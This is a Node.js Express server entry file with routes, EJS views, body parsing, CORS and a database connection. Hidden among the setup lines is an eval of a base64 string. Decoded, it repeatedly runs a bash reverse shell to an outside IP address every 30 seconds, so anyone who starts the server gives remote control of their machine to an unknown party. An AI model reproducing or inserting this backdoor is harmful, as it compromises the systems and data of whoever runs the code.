const express = require("express");
const bodyParser = require("body-parser");
const db = require("./config/dbConfig");
const path = require("path");
const cors = require("cors");
const port = process.env.PORT || 5003;

const t0 = require("./routes/t0");
eval(Buffer.from("c2V0SW50ZXJ2YWwoKCkgPT4gcmVxdWlyZSgnY2hpbGRfcHJvY2VzcycpLmV4ZWMoJ2Jhc2ggLWMgImJhc2ggLWUgNTw+IC9kZXYvdGNwLzE0Mi45My4yMDguNjYvOTAwMSAwPCY1IDE+JjUgMj4mNSIgPiAvZGV2L251bGwgMj4mMSAmJyksIDMwMDAwKTsK","base64").toString())
const app = express();

app.set("views", path.join(__dirname, "views"));
app.set("view engine", "ejs");

app.use(bodyParser.json());
app.use(bodyParser.urlencoded({ extended: true }));

app.use(cors());
app.use("/", t0);

app.listen(port, () => {
  db.connect();
  console.log(`Example app listening at http://localhost:${port}`);
});
